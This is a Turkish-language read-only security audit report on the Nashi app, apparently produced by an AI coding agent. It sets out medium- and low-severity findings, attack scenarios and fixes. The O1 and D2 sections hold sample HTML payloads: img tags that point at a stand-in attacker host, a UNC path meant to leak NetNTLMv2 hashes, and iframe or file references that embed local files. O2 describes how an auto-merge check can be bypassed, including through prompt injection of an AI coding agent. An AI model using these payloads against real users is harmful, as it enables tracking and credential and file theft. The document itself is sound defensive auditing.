# Nashi (a43b956 / v0.7.9-40) — Güvenlik incelemesi raporu

Bağlam: Kod salt okunarak incelendi. Hiçbir betik, build, test ya da uygulama çalıştırılmadı. Bulgular "Doğrulanmış" (kod yolu satır satır izlendi) ve "Olası" (etkisi çalışma zamanı davranışına bağlı) diye ayrıldı.

**REA notu:** `mcp__rea__trace_feature` denendi, `target_unavailable / No app is open` döndü. REA açılmış bir ikili istiyor; repoda derlenmiş ikili yok ve derleme yasak. Bu yüzden veri akışları **elle izlendi**:
(a) web URL → `WebDownloadEngine.link` → `downloadArguments` → `posix_spawn` argv → `NASHI_FILE` → `ExportTransaction.record/publish`,
(b) Windows HTML girdisi → `DocumentConversion` → `OfficeDocuments.OfficeAsync`.

## Özet tablo

| # | Önem | Durum | Bulgu |
|---|---|---|---|
| — | Kritik | — | Bulunmadı |
| — | Yüksek | — | Bulunmadı |
| O1 | Orta | Kod yolu doğrulandı, LO etkisi olası | Windows: HTML/EPUB girdisi png/jpg, pages ve sabit-EPUB yollarında temizlenmeden ve ağ izolasyonu olmadan LibreOffice'e gidiyor |
| O2 | Orta | Yapılandırma doğrulandı, istismar olası | Owner auto-merge değişen dosyalara bakmıyor; "hassas değişiklik" Mergify kuralı yalnız gözlem; zorunlu kontroller PR'ın kendi workflow'larından üretiliyor |
| D1 | Düşük | Doğrulandı | macOS ffmpeg/ffprobe zip'i (osxexperts.net) hash kontrolünden ÖNCE libarchive ile açılıyor |
| D2 | Düşük | Doğrulandı (tasarım tercihi) | HTML→PDF/Office dönüşümü HTML'in yanındaki dosyaları çıktıya gömebiliyor |
| D3 | Düşük | Doğrulandı | Windows güncellemesinde imza kontrolü ile çıkarma ayrı açılışlarla yapılıyor (TOCTOU) |
| D4 | Düşük | Doğrulandı | macOS web indirme loopback ve yerel ağ adreslerini kabul ediyor (Windows reddediyor) |
| D5 | Düşük / bilgi | Doğrulandı | Windows yt-dlp çağrısında `--no-plugin-dirs`/`--no-update` yok (macOS'ta var). Kurulu araçlar çalıştırmadan önce yeniden doğrulanmıyor |

---

## O1 — Windows: temizlenmemiş HTML ağ erişimi olan LibreOffice'e gidiyor (Orta)

**Dosyalar**
- `windows/Nashi.Windows/DocumentConversion.cs:40`: png/jpg dalı
- `windows/Nashi.Windows/DocumentConversion.cs:45`: pages dalı
- `windows/Nashi.Windows/DocumentConversion.cs:48`: sabit-EPUB dalı
- `windows/Nashi.Windows/DocumentConversion.cs:49`: `SanitizedHtml` yalnız bu satırda uygulanıyor. Yukarıdaki üç dal `continue` ile buraya hiç gelmiyor.
- `windows/Nashi.Core/OfficeDocuments.cs:28-35`: `soffice` doğrudan çalıştırılıyor; ağ kısıtı yok.
- Karşılaştırma: macOS `Sources/NashiCore/DocumentEngine.swift:166-169` HTML'i her zaman `embedHTMLImages` ile sınırlıyor. `:180-186` da `sandbox-exec ... (deny network* (remote ip))` kullanıyor. Yorum açıkça "LibreOffice imports linked HTML resources" diyor.

**Saldırı senaryosu:** Saldırgan kurbana `fatura.html` gönderir. İçinde `<img src="\\saldirgan.example\s\a.png">`, `<img src="http://saldirgan.example/p?id=kurban">` ya da `<img src="file:///C:/Users/kurban/Pictures/kimlik.png">` vardır. Kurban dosyayı Nashi'de PNG/JPG, Pages ya da sabit EPUB'a dönüştürür. LibreOffice bağlı kaynağı çözerse üç şey olur:
- Kurbanın IP adresi ve dönüştürme anı saldırgana gider (izleme).
- Giden SMB/WebDAV açıksa UNC yolu üzerinden NetNTLMv2 hash'i sızar.
- Yerel resimler çıktıya gömülür; kurban çıktıyı paylaşırsa bunlar da gider.

Aynı ağ açıklığı Windows'ta DOCX/ODT içindeki harici bağlı görüntüler için bütün formatlarda geçerli.

**Ayrım:** Kod yolu doğrulandı. LibreOffice'in headless modda uzak kaynağı gerçekten çektiği çalıştırılarak doğrulanmadı; ancak projenin kendi macOS yorumu bunu varsayıyor.

**Düzeltme**
1. `SanitizedHtml`'i `ext is "html" or "epub"` kaynakları için 38. satırdan önce, bütün dallar için uygula. Temizleyiciye `\\` ve `file:` ile başlayan değerleri reddetmeyi de ekle.
2. Windows'ta `soffice`'i ağ erişimi olmadan çalıştır. Seçenekler: ağ yetkisi olmayan AppContainer, ya da programa özel giden-trafik engelleyen bir güvenlik duvarı kuralı.
3. LibreOffice'in harici bağlantı ve uzak görüntü ayarlarını profilde kapat. Anahtar adlarını LibreOffice belgelerinden doğrula.
4. HTML, EPUB ve harici bağlı DOCX için regresyon testi ekle.

## O2 — Owner auto-merge hassas değişiklikleri insan incelemesi olmadan birleştirebiliyor (Orta)

**Dosyalar**
- `scripts/owner-auto-merge.py:15-29`, `:55-79`: Uygunluk kriterleri yalnız şunlar: yazar ID'si, aynı repo, head SHA, Actions app'inin `security`/`mac-source`/`windows` adlı check-run'ları. `/pulls/N/files` hiç okunmuyor.
- `.mergify.yml`: "Observe sensitive changes requiring explicit human review" kuralında `actions: {}` var, yani hiçbir şeyi zorlamıyor.
- Dal koruması (herkese açık API ile okundu): yalnız bu üç zorunlu kontrol görünüyor. Otomasyon sahibin kendi PR'larını birleştirdiğine göre (sahip kendi PR'ını onaylayamaz), zorunlu onay incelemesi açık olamaz. Bu bir çıkarım; ayar doğrudan görülemedi.
- Aynı repodan açılan PR'larda `pull_request` workflow'u PR'daki workflow dosyasıyla çalışır. Yani PR, `source.yml`'deki `security` job'unu `run: true` yaparak kontrolü anlamsız biçimde geçirebilir. Check-run adı ve app ID'si yine eşleşir.

**Doğrulanan güvenli kısım:** Dış katkıcı (fork) PR'ları uygun sayılmıyor. `owner-auto-merge.yml:21-22` ve script `:18-22` `user.id == 68860338` ve `head.repo == REPOSITORY` istiyor. Ayrıca:
- Ayrıcalıklı job yalnız `main`'i, `persist-credentials: false` ile checkout ediyor.
- PR kodu ya da artifact'i çalıştırılmıyor.
- `pull_request_target` + PR checkout kalıbı yok.
- Hiçbir workflow `secrets.*` kullanmıyor. Release imzalama CI dışında yapılıyor; EdDSA özel anahtarı CI'da hiç bulunmuyor.
- Action'lar SHA ile sabitlenmiş.

**Saldırı senaryosu:** Sahibin hesabı ya da token'ı şu yollardan biriyle PR açar:
- PR açan bir AI kodlama ajanına prompt injection,
- sahibin oturumu açık ve ele geçirilmiş bir geliştirme makinesi,
- push yetkili bir collaborator'ın sahibin PR dalına commit eklemesi.

PR `Sources/NashiUpdates` veya `.github/workflows` dosyalarını değiştirir, gerekirse kontrolleri de boşa çıkarır. CI yeşil olunca PR otomatik birleşir ve kötü kod bir sonraki yerelde imzalanan sürüme girer.

**Düzeltme**
1. Script'te `/pulls/N/files` ile değişen yolları al. Mergify'daki hassas yol regex'iyle eşleşen bir dosya varsa birleştirmeyi reddet.
2. PR'daki bütün commit'lerin yazar ve committer'ının sahip olduğunu doğrula.
3. Zorunlu kontrolleri `main`'den gelen workflow'larla sınırla: ruleset "required workflows", ya da sahibin elle eklediği bir onay etiketi.
4. Bu kuralları `scripts/test-owner-auto-merge.py`'ye regresyon testi olarak ekle.

## D1 — Doğrulanmamış upstream arşiv libarchive ile açılıyor (Düşük)

**Dosyalar:** `Sources/NashiCore/ExternalToolSetup.swift:35-51`. Tipi `"binary"` olan paketlerde (`ffmpeg9arm.zip`, `ffprobe9arm.zip`) `verify` yalnız çıkarılan iç ikiliye uygulanıyor. Arşiv önce `ArchiveCodec.extract` ile açılıyor; bu fonksiyon `readSupportFormats` = format_all kullanıyor ve genişleme sınırı 20 GB.

**Senaryo:** osxexperts.net (resmî olmayan, tek kişilik bir derleme sitesi) ele geçirilir. Sahte arşiv, hash kontrolünden önce Nashi sürecinde libarchive ayrıştırıcısını çalıştırır; bir ayrıştırıcı açığıyla kod çalıştırma, ya da zip bombasıyla disk doldurma mümkün olur. İkili değiştirme ise iç hash sayesinde engelleniyor.

**Düzeltme:** Arşivin kendi SHA-256'sını da sabitle ve çıkarmadan önce kontrol et (yt-dlp, deno ve LibreOffice'te zaten böyle). Araç kurulumunda okuyucuyu yalnız zip formatıyla sınırla ve genişleme sınırını birkaç yüz MB'a indir.

## D2 — HTML yanındaki dosyalar çıktıya gömülebiliyor (Düşük, tasarım tercihi)

**Dosyalar:** `Sources/NashiCore/HTMLPDFRenderer.swift:119-127` (sayfa klasöründeki herhangi bir normal dosya), `:136` (iframe'lere izin), `Sources/NashiCore/DocumentEngine.swift:238-239` (aynı klasördeki raster görüntüler).

**Senaryo:** `~/Downloads/rapor.html` içinde `<iframe src="vergi.txt">` ya da `<img src="pasaport.jpg">` olsun. Kullanıcı dosyayı PDF'e çevirip gönderen kişiye geri yollarsa, Downloads klasöründeki komşu dosyalar sızar. Ağ ve `fetch` engelli, bu yüzden sızma ancak kullanıcı çıktıyı paylaşırsa olur.

**Düzeltme:** Yalnız HTML'in referans verdiği raster görüntüleri geçici bir klasöre kopyalayıp oradan sun. İframe'lerle başka HTML veya metin dosyası yüklenmesini kapat, ya da dönüştürmeden önce kullanıcıyı uyar.

## D3 — Windows güncellemesinde doğrulama ile çıkarma arasında TOCTOU (Düşük)

**Dosyalar:** `windows/Nashi.Windows/UpdateInstaller.cs:16-18` ve `windows/Nashi.Core/PublicUpdates.cs:31-37`, `:39-52`. `VerifyAsync` dosyayı açıp kapatıyor, `ExtractVerified` yeniden açıyor. Aşama klasörü portable klasörün yanında, kullanıcının yazabildiği bir yerde.

**Senaryo:** Yalnız aynı kullanıcı ya da paylaşılan yazılabilir bir konum (örn. `Users:Modify` izinli `C:\Tools`) durumunda, imza kontrolünden sonra `update.zip` değiştirilebilir.

**Düzeltme:** Dosyayı `FileShare.None` ile tek handle üzerinden aç, doğrula ve aynı stream'den çıkar. Ya da doğrulanan baytları bellekte veya kilitli bir kopyada tut.

## D4 — macOS web indirmesinde yerel ağ hedefleri (Düşük)

**Dosyalar:** `Sources/NashiCore/WebDownloadEngine.swift:26-34` (`link` loopback ve özel IP'leri kabul ediyor), `:302-304` (yönlendirme yalnız şemaya bakıyor). Windows `WebDownload.cs:7` loopback ve `.local` adreslerini reddediyor.

**Senaryo:** Kullanıcının bir web sayfasından sürüklediği kart (`WebMediaDragPayload`) ya da `127.0.0.1`/`192.168.x` adresine yönlendiren bir bağlantı, kullanıcı İndir'e bastığında yerel servislere HEAD/GET ve yt-dlp generic istekleri gönderir. Kullanıcı etkileşimi gerektiği için etkisi düşük.

**Düzeltme:** DNS çözümlemesinden sonra loopback, link-local ve özel aralıkları reddet; aynı kontrolü yönlendirmelere de uygula. Windows ile davranışı eşitle.

## D5 — Bilgi düzeyi

- `windows/Nashi.Core/WebDownload.cs:20`: Windows yt-dlp argümanlarında `--no-plugin-dirs`, `--no-update` ve `--no-remote-components` eksik (macOS `WebDownloadEngine.swift:142`'de var). `--ignore-config` eklentileri durdurmuyor. Yalnız aynı kullanıcı istismar edebilir; parite için ekle.
- `ProcessRunner.swift:84-111` ve `Toolchain.cs:19-31`: Kurulumdan sonra araçlar (`Application Support/Nashi/Tools`, `%LOCALAPPDATA%`, PATH ve Homebrew yedekleri) çalıştırmadan önce yeniden hash'lenmiyor. Aynı kullanıcının yetki sınırı olmadığından bilgi düzeyinde.

---

## Yanlış alarm olmadığı doğrulanan güçlü yönler

**Sparkle (macOS)**
- `Resources/Info.plist`: `SUPublicEDKey`, `SURequireSignedFeed=true`, `SUVerifyUpdateBeforeExtraction=true`, `SUSignedFeedFailureExpirationInterval=0`.
- `UpdateConfiguration.swift:22-48` bunlar eksikse başlatmayı reddediyor.
- Feed imzalı olduğu için eski bir appcast'i tekrar sunmak yalnız eski sürümleri gösterir. Downgrade ya da rollback yok.
- EdDSA özel anahtarı repoda ve CI'da yok.

**Windows güncelleme**
- Ed25519 imzası arşivin tamamı üzerinde, BouncyCastle ile doğrulanıyor (`PublicUpdates.cs:31-37`).
- İmzalı paket içindeki `Nashi.dll` FileVersion'ı manifest sürümüne eşit olmak zorunda (`UpdateInstaller.cs:19-21`). Bu yüzden imzasız manifest sürüm sahteciliği ya da downgrade yapamaz.
- URL `github.com/<repo>/releases/download/` ile sınırlı.
- Zip-slip, link ve ADS koruması var (`SafePaths.cs`, `ExtractVerified`). Dizin değiştirme rename ile yapılıyor ve yedek tutuluyor.

**Özel GitHub köprüsü**
- Yalnız 127.0.0.1'e bağlanıyor; yol, 2×UUID nonce içeriyor.
- `Host` başlığı birebir eşleşmeli; TE ve CL reddediliyor.
- Token Sparkle'a hiç verilmiyor.
- Yönlendirmeler GitHub CDN izin listesiyle sınırlı ve Authorization taşımıyor.
- Arşiv URL'si yapılandırılmış repoyla sınırlı (`GitHubUpdateTransport.swift:125-153`).

**XPC credential broker**
- İstemci tarafı (`UpdateCredentialBroker.swift:147-178`): bundle ve binary SHA-256'sını sabitliyor, `SecStaticCodeCheckValidity` strict + nested kontrolü yapıyor, `setCodeSigningRequirement` ile `certificate leaf = H"..."` istiyor ve sırdan önce handshake yapıyor.
- Servis tarafı (`main.swift:132-139`): UID eşleşmesi ve per-message audit-token tabanlı `setCodeSigningRequirement(callerRequirement)`.
- Yalnız repo başına GitHub PAT saklıyor: login keychain, `AfterFirstUnlockThisDeviceOnly`, senkronize değil.
- Sınır: `callerRequirement` değeri build sırasında `build-credential-broker.py` ile üretiliyor ve bu betik herkese açık ağaçta yok. Gereksinimin içeriği bu yüzden doğrulanamadı. Public build'de broker hiç yok.

**Araç kurulumu**
- Bütün URL'ler ve SHA-256 değerleri kaynakta sabit; yalnız HTTPS'e yönlendirmeye izin var.
- Aşamalı kurulum yapılıp sonra atomik olarak yayınlanıyor.
- LibreOffice DMG ve MSI tam hash'le doğrulanıyor.

**Komut çalıştırma**
- Shell yok; her yerde argv kullanılıyor (`posix_spawn`, `Process`, `ArgumentList`).
- Girdi yolları mutlak, bu yüzden `-` ile başlayan dosya adıyla seçenek enjeksiyonu mümkün değil.
- yt-dlp: `--ignore-config` var ve URL'den önce `--` geliyor.
- ffmpeg: her girdi için `-protocol_whitelist file,pipe,crypto,data`; concat listelerinde üretilmiş adlar kullanılıyor.
- exiftool `-config ""` ile çalışıyor.
- LibreOffice: MacroSecurityLevel 3, UpdateLinkMode 0, izole profil.
- Deno en az yetkiyle: `--allow-read`/`--allow-write` yalnız ilgili dosyalar.

**Arşiv ve ayrıştırma**
- libarchive: mutlak yol ve `..` reddi, lstat tabanlı symlink bileşen kontrolü, ertelenmiş link, giriş ve bayt sınırı.
- EPUB'da harici entity kapalı ve DTD reddi var.
- `ExportTransaction`: `RENAME_EXCL` ile yayın ve staging sınırlaması.

**IPC:** Windows named pipe `CurrentUserOnly`.

**Sır taraması:** Çalışma ağacında ve 538 commit'lik geçmişte `git grep` / `git log -G` ile özel anahtar, ghp/github_pat, AKIA, xox, sk- ve kimlik dosyası (`.p12/.pem/.key/.env`) arandı. Yalnız `github_pat_TEST_ONLY_NOT_A_CREDENTIAL` gibi test fixture'ları bulundu. Sızıntı yok.

## Kapsam sınırları

- Sparkle'ın kendi iç doğrulaması güvenilir kabul edildi.
- LibreOffice, ffmpeg ve WebKit çalışma zamanı davranışı çalıştırılmadı.
- Derinlemesine bakılmayanlar: Windows `MediaEngine`, PdfPig/HEIF ayrıştırıcıları, `PagesInterop.js` içeriği.
- Dal korumasındaki inceleme gereksinimi API'de görünmüyor.
- GitHub MCP bağlanamadı; dal koruması `gh api` ile salt okunur olarak okundu.

## Doğrulama (düzeltmeler uygulanırsa)

- O1: Windows'ta `<img src="\\host\x">` ve `http://` içeren bir HTML fixture'ını png, pages ve sabit-EPUB'a dönüştür. Ağ trafiği olmamalı ve çıktıda harici görüntü bulunmamalı. `Nashi.Verify`'a test ekle.
- O2: `scripts/test-owner-auto-merge.py`'ye `.github/` veya `Sources/NashiUpdates/` dokunan bir owner PR'ının reddedildiği bir vaka ekle.
- D1: Bozuk ya da yanlış hash'li bir arşivin çıkarılmadan reddedildiğini birim testiyle göster.
